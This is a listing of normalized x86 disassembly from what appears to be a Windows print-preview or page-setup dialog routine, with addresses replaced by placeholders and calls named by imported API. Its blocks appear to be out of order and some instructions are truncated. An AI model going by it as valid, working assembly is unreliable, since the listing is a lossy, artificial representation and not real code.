mov ebp [ wsprintfA@IAT ]
mov esi ebx
imul esi esi 0x70
nop
lea eax [ ecx + eax + 0x4 ]
mov eax [ ecx + eax + 0x4 ]
jmp r-xdata
mov ecx rw-data
mov [ esp + 0x588 ] 0xffffffff
call sub_401420
mov eax [ esp + 0x70 ]
mov edx [ esp + 0x80 ]
mov ecx [ esp + 0x78 ]
add eax edx
cmp eax ecx
mov [ esp + 0x70 ] eax
jne r-xdata
mov edx [ rw-data ]
mov ebx [ esp + 0x10 ]
mov ebx [ ebx + edx ]
push 0x0
push 0x0
push 0x0
sub edi eax
sub esi ecx
call sub_40af00
push eax
mov ecx [ esp + 0x68 ]
mov edx [ esp + 0x64 ]
xor eax eax
mov al [ rw-data ]
push eax
push 0x1
push edi
push esi
push 0x0
push 0x0
push edi
push esi
mov esi [ esp + 0x5d0 ]
push ecx
push edx
push esi
mov ecx ebx
call sub_4421e0
mov al [ esp + 0x59c ]
test al al
mov edi [ esp + 0x2c ]
je r-xdata
mov edx [ esp + 0x5a0 ]
test edx edx
mov [ esp + 0x54 ] ecx
mov [ esp + 0x5c ] esi
mov [ esp + 0x58 ] eax
mov [ esp + 0x60 ] edi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ esp + 0x590 ]
cmp [ edx ] ebx
jg r-xdata
mov edx [ esp + 0x598 ]
push eax
push edx
lea eax [ esp + 0x2b8 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x10
push 0x4
push r--data
lea ecx [ esp + 0x2b8 ]
push ecx
push 0x0
call [ MessageBoxA@IAT ]
cmp eax 0x7
jne r-xdata
mov ecx rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x588 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x44 ]
cmp eax 0xffffffff
je r-xdata
lea eax [ edi + 0x1 ]
push eax
lea ecx [ esp + 0xb4 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
lea edx [ esp + 0x54 ]
push edx
push esi
call [ DrawFocusRect@IAT ]
lea eax [ esp + 0xb0 ]
push eax
call [ lstrlenA@IAT ]
mov edx [ esp + 0x58 ]
push eax
mov eax [ esp + 0x58 ]
lea ecx [ esp + 0xb4 ]
push ecx
push edx
push eax
push esi
call [ TextOutA@IAT ]
mov esi [ esp + 0x14 ]
mov ebp [ esp + 0x24 ]
mov [ esp + 0x20 ] 0xffffffff
jmp r-xdata
mov eax [ esp + 0x2c ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push eax
push ebx
mov [ esp + 0x40 ] ebx
call sub_4706c0
mov edx [ esp + 0x58 ]
mov ecx [ esp + 0x44 ]
mov edi eax
add ebx edx
add esp 0x10
add esi ecx
cmp edi 0xfffffffe
mov [ esp + 0x20 ] edi
mov [ esp + 0x598 ] ebx
je r-xdata
mov [ esp + 0x44 ] edi
cmp eax edi
jle r-xdata
mov [ esp + 0x18 ] esi
mov [ esp + 0x28 ] ebp
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x14 ]
mov ebp [ esp + 0x24 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x1c ] 0xffffffff
jmp r-xdata
test edi edi
jge r-xdata
mov [ esp + 0x4c ] edi
cmp eax edi
jge r-xdata
mov eax [ esp + 0x4c ]
cmp eax 0xffffffff
je r-xdata
mov eax edx
cdq
idiv ebx
mov [ esp + ecx + 0x3c ] eax
mov eax [ esp + 0x38 ]
mov edx [ esp + 0x10 ]
mov [ esp + ecx + 0x3c ] edx
cdq
idiv edi
jmp r-xdata
mov ecx [ rw-data ]
mov esi [ ecx + edi * 4 ]
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx esi
push edx
call sub_4440b0
mov esi eax
mov eax [ rw-data ]
mov ebp [ eax + edi * 4 ]
mov [ esp + 0x18 ] esi
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx ebp
call sub_444100
mov edx [ esp + 0x30 ]
mov ebp eax
push edx
mov [ esp + 0x2c ] ebp
call sub_4a9250
add esp 0x4
test al al
jne r-xdata
mov al [ esp + 0x59c ]
test al al
jne r-xdata
mov edi [ esp + ecx + 0x14 ]
mov ebx [ esp + ecx + 0x24 ]
mov eax [ esp + 0x10 ]
mov edx edi
imul eax ebx
imul edx [ esp + 0x38 ]
cmp eax edx
jge r-xdata
mov eax [ rw-data ]
cmp eax 0x1
mov edi [ esp + 0x14 ]
jne r-xdata
mov [ esp + ecx + 0x68 ] eax
add ecx 0x4
cmp ecx 0x8
jl r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x48 ]
mov esi [ esp + 0x14 ]
mov ebp [ esp + 0x24 ]
sub ebx eax
mov [ esp + 0x20 ] 0xffffffff
mov [ esp + 0x598 ] ebx
jmp r-xdata
mov ecx [ esp + 0x594 ]
cmp ebx [ ecx ]
jg r-xdata
mov eax [ rw-data ]
cmp [ esi + eax + 0x18 ] 0x10
jb r-xdata
cmp eax 0x2
jne r-xdata
mov ecx [ esp + 0x24 ]
mov edx esi
mov eax ebp
imul edx ecx
imul eax edi
cmp eax edx
jle r-xdata
cmp [ esp + 0x5b4 ] 0x1
jne r-xdata
mov ecx [ esp + 0x2c ]
test ecx ecx
jne r-xdata
lea eax [ esi + eax + 0x4 ]
mov eax [ esi + eax + 0x4 ]
jmp r-xdata
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x24 ]
mov ecx esi
mov eax ebp
imul ecx edx
imul eax edi
cmp eax ecx
jge r-xdata
mov eax [ esp + 0x6c ]
mov [ esp + 0x68 ] eax
imul eax edi
cdq
idiv ecx
mov [ esp + 0x3c ] eax
mov ecx [ esp + 0x68 ]
mov eax esi
imul eax ecx
cdq
idiv ebp
mov [ esp + 0x6c ] ecx
mov ecx eax
mov [ esp + 0x40 ] ecx
jmp r-xdata
mov eax [ esp + 0x64 ]
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x10 ] eax
xor ecx ecx
lea ebx [ ebx ]
test eax eax
je r-xdata
mov cl [ esp + 0x5b4 ]
test cl cl
jne r-xdata
mov ecx rw-data
call sub_401420
xor eax eax
jmp r-xdata
push eax
push ebx
lea ecx [ esp + 0x420 ]
push r--data
push ecx
call ebp
add esp 0x10
push 0x4
push r--data
lea edx [ esp + 0x420 ]
push edx
push 0x0
call [ MessageBoxA@IAT ]
cmp eax 0x7
jne r-xdata
test eax eax
sete bl
test eax eax
setne bl
jmp r-xdata
mov ecx [ esp + 0x40 ]
mov eax ecx
imul eax edx
cdq
idiv edi
mov [ esp + 0x3c ] ecx
mov [ esp + 0x68 ] eax
jmp r-xdata
mov ecx [ esp + 0x3c ]
mov eax ebp
imul eax ecx
cdq
idiv esi
mov [ esp + 0x40 ] ecx
mov [ esp + 0x6c ] eax
jmp r-xdata
imul esi [ esp + 0x3c ]
imul ecx edi
xor edx edx
cmp esi ecx
setge dl
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x50 ] edx
lea ecx [ ecx ]
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x30 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x14 ] esi
mov esi eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x24 ] ebp
mov ebp eax
mov eax [ esp + 0x2c ]
mov [ esp + 0x1c ] edi
mov [ esp + 0x2c ] ecx
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov esi [ esp + 0x14 ]
mov ebp [ esp + 0x24 ]
dec ebx
mov [ esp + 0x598 ] ebx
mov [ esp + 0x20 ] eax
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x1c ] 0xffffffff
jmp r-xdata
mov eax [ esp + 0x34 ]
inc eax
cmp eax 0x2
mov [ esp + 0x34 ] eax
jl r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ esp + ebx * 4 + 0x1c ] 0xffffffff
je r-xdata
mov eax [ esp + 0x48 ]
mov esi [ esp + 0x14 ]
mov ebp [ esp + 0x24 ]
sub ebx eax
mov [ esp + 0x20 ] 0xffffffff
mov [ esp + 0x598 ] ebx
jmp r-xdata
mov eax [ esp + 0x90 ]
xor ebx ebx
test eax eax
mov eax [ esp + 0x34 ]
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x50 ]
mov esi [ esp + eax * 4 + 0x14 ]
mov ecx [ esp + eax * 4 + 0x3c ]
mov eax [ esp + ebx * 4 + 0x14 ]
imul eax ecx
cdq
idiv esi
mov ebp eax
mov eax [ esp + ebx * 4 + 0x24 ]
imul eax ecx
cdq
idiv esi
mov esi eax
mov ebp [ esp + ebx * 4 + 0x3c ]
mov esi [ esp + ebx * 4 + 0x68 ]
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x9c ]
lea ecx [ edx + eax ]
lea edi [ ecx + ebp ]
mov ecx [ esp + 0x9c ]
mov eax [ esp + 0x10 ]
lea edi [ eax + ecx ]
mov ecx edi
sub ecx ebp
jmp r-xdata
mov eax [ esp + 0x34 ]
test eax eax
jne r-xdata
mov ebp [ rw-data ]
mov edx [ esp + ebx * 4 + 0x1c ]
mov ebp [ ebp + edx * 4 ]
push 0x0
push 0x0
push 0x0
sub esi eax
sub edi ecx
call sub_40af00
mov edx [ esp + 0x64 ]
push eax
mov eax [ esp + 0x64 ]
xor ecx ecx
mov cl [ rw-data ]
push ecx
mov ecx [ esp + 0x5b4 ]
push 0x1
push esi
push edi
push 0x0
push 0x0
push esi
push edi
push edx
push eax
push ecx
mov ecx ebp
call sub_4421e0
mov al [ esp + 0x59c ]
test al al
je r-xdata
mov eax [ esp + 0x38 ]
mov ebp [ esp + 0xa0 ]
sub eax esi
cdq
sub eax edx
mov edx [ esp + 0x5a0 ]
sar eax 0x1
add eax ebp
add esi eax
test edx edx
mov [ esp + 0x54 ] ecx
mov [ esp + 0x5c ] edi
mov [ esp + 0x58 ] eax
mov [ esp + 0x60 ] esi
je r-xdata
mov ecx [ esp + 0x44 ]
cmp ecx 0xffffffff
je r-xdata
mov esi [ esp + 0x5a0 ]
lea edx [ esp + 0x54 ]
push edx
push esi
call [ DrawFocusRect@IAT ]
mov eax [ esp + ebx * 4 + 0x2c ]
inc eax
push eax
lea ecx [ esp + 0xb4 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0xc
lea edx [ esp + 0xb0 ]
push edx
call [ lstrlenA@IAT ]
mov ecx [ esp + 0x58 ]
mov edx [ esp + 0x54 ]
push eax
lea eax [ esp + 0xb4 ]
push eax
push ecx
push edx
push esi
call [ TextOutA@IAT ]
mov eax [ esp + ebx * 4 + 0x2c ]
mov [ esp + 0x44 ] eax
mov eax [ esp + ebx * 4 + 0x2c ]
cmp ecx eax
jle r-xdata
mov [ esp + 0x4c ] eax
cmp ecx eax
jge r-xdata
mov ecx [ esp + 0x4c ]
cmp ecx 0xffffffff
je r-xdata
sub_475d90
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
cmp [ esi ] 0x0
push edi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov al [ esi + 0x8 ]
test al al
je r-xdata
push 0xa
call [ Sleep@IAT ]
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
push eax
call [ GetDC@IAT ]
xor ecx ecx
mov cl [ esi + 0x18 ]
mov edi eax
lea edx [ esi + 0x1c ]
lea ebp [ esi + 0x10 ]
lea ebx [ esi + 0xc ]
push ecx
mov ecx [ edx ]
sub esp 0x10
mov eax esp
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov edx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
push edi
mov [ eax + 0xc ] edx
mov eax [ esi + 0x14 ]
push 0x1
push eax
push ebp
push ebx
call sub_4751c0
mov ecx [ esi + 0x4 ]
add esp 0x28
push edi
push ecx
call [ ReleaseDC@IAT ]
cmp [ esi ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0x18 ] 0x0
jne r-xdata
mov [ rw-data ] 0x0
cmp [ rw-data ] 0x1
mov edx [ esi + 0x4 ]
jne r-xdata
mov eax [ ebp ]
mov ecx [ ebx ]
push eax
push ecx
push 0x1410
push edx
call [ GetParent@IAT ]
push eax
call [ PostMessageA@IAT ]
push 0x0
push 0x0
push edx
call [ InvalidateRect@IAT ]
jmp r-xdata
sub_475e60
mov eax [ esp + 0x8 ]
sub esp 0x170
cmp eax 0x111
push ebx
push ebp
push esi
push edi
ja r-xdata
cmp eax 0x113
je r-xdata
je r-xdata
cmp [ esp + 0x18c ] 0x4d2
jne r-xdata
cmp eax 0x1410
jne r-xdata
mov ecx [ esp + 0x18c ]
mov edi [ esp + 0x184 ]
movzx eax cx
cmp eax 0xa2e
jg r-xdata
sub eax 0x2
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x170
retn 0x10
mov eax [ rw-data ]
test eax eax
mov esi [ esp + 0x184 ]
je r-xdata
mov ebx [ esp + 0x18c ]
test ebx ebx
mov esi [ esp + 0x184 ]
mov edi [ EnableWindow@IAT ]
mov ebp [ GetDlgItem@IAT ]
jbe r-xdata
cmp eax 0xa3e
jg r-xdata
je r-xdata
mov al [ rw-data ]
test al al
mov eax [ rw-data ]
je r-xdata
sub eax 0x29
je r-xdata
push 0x4d2
push esi
call [ KillTimer@IAT ]
push eax
mov [ rw-data ] 0x0
call [ ResumeThread@IAT ]
push 0x0
push 0x0
push 0xa38
push esi
call [ GetDlgItem@IAT ]
push eax
call [ InvalidateRect@IAT ]
mov eax [ rw-data ]
lea ecx [ eax - 0x1 ]
mov eax [ esp + 0x190 ]
cmp eax ecx
jl r-xdata
push 0x1
push 0xa3f
push esi
call ebp
push eax
call edi
cmp eax 0xa45
jg r-xdata
je r-xdata
mov esi [ esp + 0x184 ]
mov ebx [ GetDlgItem@IAT ]
push 0x1
push 0xa31
push esi
call ebx
mov edi [ EnableWindow@IAT ]
push eax
call edi
push 0x1
push 0xa2f
push esi
call ebx
push eax
call edi
push 0x0
push 0xa32
push esi
call ebx
push eax
call edi
push 0x0
push 0xa30
push esi
call ebx
push eax
call edi
mov edi [ IsDlgButtonChecked@IAT ]
push 0xa32
push esi
call edi
test eax eax
jne r-xdata
cmp eax 0x480
jg r-xdata
test eax eax
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
je r-xdata
test eax eax
je r-xdata
mov esi [ esp + 0x184 ]
mov edi [ GetDlgItem@IAT ]
push 0x0
push 0xa3e
push esi
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x0
push 0xa3f
push esi
call edi
push eax
call ebx
mov al [ rw-data ]
test al al
je r-xdata
sub eax 0xe5
jne r-xdata
push 0x1
push 0xa3e
push esi
call ebp
push eax
call edi
cmp [ rw-data ] 0x1
jne r-xdata
cmp eax 0xdc0
jl r-xdata
cmp eax 0xa43
jge r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
sub eax 0xa2f
cmp eax 0xd
ja r-xdata
push 0xa2f
push 0xa30
push esi
call edi
test eax eax
je r-xdata
sub eax 0xa29
cmp eax 0x4
ja r-xdata
je r-xdata
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x0
xor eax eax
pop ebx
add esp 0x170
retn 0x10
push eax
call [ ResumeThread@IAT ]
mov eax [ rw-data ]
mov ebp [ esp + 0x190 ]
mov ecx [ ebp + 0x1c ]
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x20 ]
mov ebx [ ebp + 0x28 ]
sub edi ecx
mov ecx [ rw-data ]
sub ebx eax
mov eax [ rw-data ]
mov edx ecx
imul eax ebx
imul edx edi
cmp edx eax
jge r-xdata
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x1
xor eax eax
pop ebx
add esp 0x170
retn 0x10
mov esi [ esp + 0x184 ]
mov ebx [ GetDlgItem@IAT ]
push 0xa38
push esi
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
mov [ rw-data ] 0x0
call ebx
mov [ rw-data ] eax
lea eax [ esp + 0x14 ]
push eax
push 0x4
push rw-data
push sub_475d90
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x0
push 0xa3e
push esi
mov [ rw-data ] eax
call ebx
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push 0x0
push 0xa3f
push esi
call ebx
push eax
call ebp
xor eax eax
mov ecx 0x15
lea edi [ esp + 0x2c ]
[ edi ]
lea ecx [ esp + 0x2c ]
push ecx
mov [ esp + 0x30 ] 0x54
mov [ esp + 0x40 ] 0x402
call [ PageSetupDlgA@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x190 ]
inc ebx
push ebx
inc edx
push edx
lea eax [ esp + 0x24 ]
push r--data
push eax
call edi
add esp 0x10
lea ecx [ esp + 0x1c ]
push ecx
push 0xa41
push esi
call ebp
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x0
xor eax eax
pop ebx
add esp 0x170
retn 0x10
push 0x422
push esi
call [ IsDlgButtonChecked@IAT ]
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov edi [ wsprintfA@IAT ]
mov ebp [ SetDlgItemTextA@IAT ]
je r-xdata
test bl 0x1
jne r-xdata
cmp eax 0xdc3
jg r-xdata
push 0x0
push 0x0
push 0xa38
push edi
call [ GetDlgItem@IAT ]
push eax
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x170
retn 0x10
cmp eax 0xa3f
jne r-xdata
cmp eax 0x2
je r-xdata
mov eax [ rw-data ]
lea ecx [ eax - 0x1 ]
test cl 0x1
je r-xdata
movzx edx [ eax + lookup_table_47702c ]
jmp [ edx * 4 + jump_table_47701c ]
push 0x0
push 0x0
push 0xa38
push esi
call ebx
push eax
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x170
retn 0x10
jmp [ eax * 4 + jump_table_477008 ]
mov eax ecx
shr eax 0x10
cmp eax 0x300
jne r-xdata
cmp eax 0x422
jg r-xdata
cdq
idiv ecx
mov ecx eax
mov eax edi
sub eax ecx
cdq
sub eax edx
mov [ esp + 0x14 ] ecx
mov ecx eax
mov eax [ esp + 0x14 ]
sar ecx 0x1
lea edi [ eax + ecx ]
xor eax eax
mov eax edx
cdq
idiv [ rw-data ]
xor ecx ecx
mov edx eax
mov eax ebx
sub eax edx
mov [ esp + 0x14 ] edx
cdq
sub eax edx
mov edx [ esp + 0x14 ]
sar eax 0x1
lea ebx [ eax + edx ]
jmp r-xdata
mov eax [ rw-data ]
mov edi [ CheckRadioButton@IAT ]
add eax 0xdc0
push eax
push 0xdc3
push 0xdc0
push esi
call edi
mov ecx [ rw-data ]
add ecx 0xa2b
push ecx
push 0xa2e
push 0xa2b
push esi
call edi
mov edx [ rw-data ]
and edx 0x1
push 0x0
add edx 0xa2f
push edx
push esi
call ebx
push eax
call ebp
mov eax [ rw-data ]
and eax 0x1
push 0x0
add eax 0xa31
push eax
push esi
call ebx
push eax
call ebp
mov ecx [ rw-data ]
add ecx 0xa2f
push ecx
push 0xa32
push 0xa2f
push esi
call edi
cmp [ rw-data ] 0x2
je r-xdata
mov edx [ esp + 0x34 ]
push edx
call [ GlobalLock@IAT ]
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
add eax 0x46
push eax
push 0xa37
push esi
mov [ rw-data ] ecx
mov [ rw-data ] edx
call [ SetDlgItemTextA@IAT ]
mov [ rw-data ] ebx
lea edx [ ebx + 0x1 ]
push edx
lea eax [ esp + 0x84 ]
push r--data
push eax
call edi
add esp 0xc
lea ecx [ esp + 0x80 ]
push ecx
push 0x480
push esi
call ebp
mov edx [ esp + 0x190 ]
inc edx
push edx
lea eax [ esp + 0x84 ]
push r--data
push eax
call edi
add esp 0xc
lea ecx [ esp + 0x80 ]
push ecx
push 0x481
push esi
call ebp
cmp eax ebx
je r-xdata
mov ebx [ esp + 0x184 ]
add eax 0xfffff240
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
add eax 0x2
cmp eax ecx
jge r-xdata
cmp eax 0x3
je r-xdata
mov ecx [ rw-data ]
cmp eax ecx
je r-xdata
inc eax
mov [ rw-data ] eax
jmp r-xdata
cmp cx 0x420
jne r-xdata
mov eax [ esp + 0x184 ]
push 0x0
push 0x0
push 0xa38
push eax
call [ GetDlgItem@IAT ]
push eax
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x170
retn 0x10
mov esi [ esp + 0x184 ]
mov ebx [ GetDlgItem@IAT ]
push 0x0
push 0xa31
push esi
call ebx
mov edi [ EnableWindow@IAT ]
push eax
call edi
push 0x0
push 0xa2f
push esi
call ebx
push eax
call edi
push 0x1
push 0xa32
push esi
call ebx
push eax
call edi
push 0x1
push 0xa30
push esi
call ebx
push eax
call edi
mov edi [ IsDlgButtonChecked@IAT ]
push 0xa31
push esi
call edi
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp eax 0x473
jne r-xdata
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax edi
cdq
idiv ecx
mov ebp [ esp + 0x1c ]
push 0x0
push 0x0
push 0xa29
push esi
add ebp eax
mov eax [ rw-data ]
imul eax edi
cdq
idiv ecx
mov edi [ esp + 0x34 ]
mov ecx [ rw-data ]
mov [ esp + 0x2c ] ebp
mov ebp [ esp + 0x38 ]
sub edi eax
mov eax [ rw-data ]
imul eax ebx
cdq
idiv ecx
mov edx [ esp + 0x30 ]
mov [ esp + 0x34 ] edi
mov edi [ GetDlgItemInt@IAT ]
add edx eax
mov eax [ rw-data ]
imul eax ebx
mov [ esp + 0x30 ] edx
cdq
idiv ecx
sub ebp eax
mov [ esp + 0x38 ] ebp
call edi
push 0x0
push 0x0
push 0xa2a
push esi
mov [ rw-data ] eax
call edi
push 0x0
push 0x0
push 0x480
push esi
mov [ rw-data ] eax
call edi
push 0x0
push 0x0
push 0x481
push esi
mov ebx eax
call edi
mov edi [ IsDlgButtonChecked@IAT ]
push 0x420
push esi
mov ebp eax
call edi
cmp eax 0x1
je r-xdata
mov edi [ esp + 0x20 ]
mov eax [ esp + 0x28 ]
sub eax edi
cdq
push 0x1
lea ecx [ esp + 0x20 ]
push ecx
sub eax edx
mov edx [ ebp + 0x18 ]
push 0xffffffff
sar eax 0x1
push r--data
sub eax 0x6
push edx
mov [ esp + 0x34 ] eax
call [ DrawTextA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x170
retn 0x10
mov [ esp + 0x28 ] ebx
mov [ esp + 0x20 ] eax
sub ebx eax
push 0x10
mov [ esp + 0x28 ] edi
lea eax [ ebp + 0x1c ]
mov [ esp + 0x20 ] ecx
sub edi ecx
mov ecx [ ebp + 0x18 ]
push eax
push ecx
call [ FillRect@IAT ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
push edx
mov edx [ esp + 0x20 ]
push eax
mov eax [ ebp + 0x18 ]
push ecx
push edx
push eax
call [ Rectangle@IAT ]
cmp [ rw-data ] 0x1
jne r-xdata
push 0x1
push 0xa33
push esi
call [ CheckDlgButton@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x1
push 0x0
push 0xa3c
push ebx
call [ CheckDlgButton@IAT ]
push 0x0
jmp r-xdata
cmp eax 0x2
je r-xdata
mov ecx [ rw-data ]
lea eax [ ecx - 0x1 ]
test al 0x1
jne r-xdata
mov ecx [ rw-data ]
add ecx 0x2
mov edx [ rw-data ]
inc edx
mov [ rw-data ] edx
jmp r-xdata
inc ecx
jmp r-xdata
mov edx [ esp + 0x184 ]
push 0x0
push 0x0
push 0xa38
push edx
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
call [ GetDlgItem@IAT ]
push eax
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x170
retn 0x10
push 0x420
push edi
call [ IsDlgButtonChecked@IAT ]
mov esi [ GetDlgItemInt@IAT ]
push 0x0
mov ebx eax
dec ebx
push 0x0
neg ebx
push 0x480
sbb bl bl
push edi
inc bl
call esi
push 0x0
push 0x0
push 0xa29
push edi
mov ebp eax
call esi
push 0x0
push 0x0
push 0xa2a
push edi
mov [ esp + 0x28 ] eax
call esi
test ebp ebp
mov [ esp + 0x10 ] eax
je r-xdata
mov [ rw-data ] 0x0
push 0xa30
jmp r-xdata
push 0xa2f
push esi
call edi
test eax eax
je r-xdata
cmp cx 0x480
mov edi [ esp + 0x184 ]
jne r-xdata
cmp ecx 0x1
jne r-xdata
dec eax
je r-xdata
mov ebp [ rw-data ]
mov ebx 0x1
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
push 0x0
push 0xa39
push esi
call ebx
push eax
call ebp
push 0x0
push 0xa3a
push esi
call ebx
push eax
call ebp
push 0x0
push 0xa3c
push esi
call ebx
push eax
call ebp
push 0x0
push 0xa43
push esi
call ebx
push eax
call ebp
push 0x0
push 0xa44
push esi
call ebx
push eax
call ebp
push 0x0
push 0xa45
push esi
call ebx
push eax
call ebp
jmp r-xdata
test ebp ebp
je r-xdata
push 0xa3c
push ebx
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
mov esi [ GetDlgItemInt@IAT ]
push 0x0
push 0x0
push 0x480
push ebx
call esi
push 0x0
push 0x0
push 0xa29
push ebx
mov edi eax
call esi
push 0x0
push 0x0
push 0xa2a
push ebx
mov ebp eax
call esi
test edi edi
mov [ esp + 0x10 ] eax
je r-xdata
mov eax [ rw-data ]
add eax 0xfffffffe
test eax eax
jl r-xdata
cmp eax 0x3
je r-xdata
mov [ rw-data ] eax
lea eax [ ecx + 0x1 ]
mov ecx [ rw-data ]
cmp eax ecx
mov [ rw-data ] eax
jne r-xdata
mov [ rw-data ] ecx
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push 0xa32
push 0xa2f
push esi
call [ CheckRadioButton@IAT ]
push 0x420
push edi
call [ IsDlgButtonChecked@IAT ]
mov ebx eax
dec ebx
neg ebx
sbb bl bl
inc bl
xor bl bl
jmp r-xdata
xor eax eax
mov ecx 0x15
lea edi [ esp + 0x2c ]
[ edi ]
lea ecx [ esp + 0x2c ]
push ecx
mov [ esp + 0x30 ] 0x54
mov [ esp + 0x40 ] 0x402
call [ PageSetupDlgA@IAT ]
test eax eax
mov esi [ esp + 0x184 ]
je r-xdata
mov esi [ esp + 0x184 ]
mov edi [ GetDlgItemInt@IAT ]
push 0x0
push 0x0
push 0xa29
push esi
call edi
push 0x0
push 0x0
push 0xa2a
push esi
mov [ rw-data ] eax
call edi
mov edi [ IsDlgButtonChecked@IAT ]
push 0xa33
push esi
mov [ rw-data ] eax
call edi
dec eax
neg eax
sbb eax eax
push 0xa39
inc eax
push esi
mov [ rw-data ] eax
call edi
dec eax
neg eax
sbb eax eax
neg eax
mov [ rw-data ] eax
xor ebx ebx
lea esp [ esp ]
sub eax 0x41f
jne r-xdata
test ebp ebp
je r-xdata
test ebx ebx
je r-xdata
push 0x1
push 0x0
push 0xa3c
push esi
call [ CheckDlgButton@IAT ]
push 0x0
jmp r-xdata
push 0x1
push 0xa3c
push esi
call [ CheckDlgButton@IAT ]
mov edx [ rw-data ]
add edx 0xa39
push edx
push 0xa3a
push 0xa39
push esi
call edi
mov eax [ rw-data ]
add eax 0xa43
push eax
push 0xa45
push 0xa43
push esi
call edi
mov eax [ rw-data ]
test eax eax
jne r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
dec eax
jmp r-xdata
mov ecx [ esp + 0x184 ]
push 0x0
push 0x0
push 0xa38
push ecx
mov [ rw-data ] 0x1
mov [ rw-data ] 0xffffffff
call [ GetDlgItem@IAT ]
push eax
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x170
retn 0x10
lea eax [ ecx - 0x2 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov esi [ GetDlgItemInt@IAT ]
push 0x0
push 0x0
push 0x480
push edi
call esi
push 0x0
push 0x0
push 0xa29
push edi
mov ebp eax
call esi
push 0x0
push 0x0
push 0xa2a
push edi
mov [ esp + 0x20 ] eax
call esi
test ebp ebp
mov [ esp + 0x18 ] eax
je r-xdata
push 0x0
push 0x0
push 0xa38
push esi
call [ GetDlgItem@IAT ]
push eax
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x170
retn 0x10
mov edx [ esp + 0x34 ]
push edx
call [ GlobalLock@IAT ]
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x44 ]
add eax 0x46
push eax
push 0xa37
push esi
mov [ rw-data ] ecx
mov [ rw-data ] edx
call [ SetDlgItemTextA@IAT ]
inc ebx
cmp ebx 0x4
jl r-xdata
mov [ rw-data ] ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0xa3c
push esi
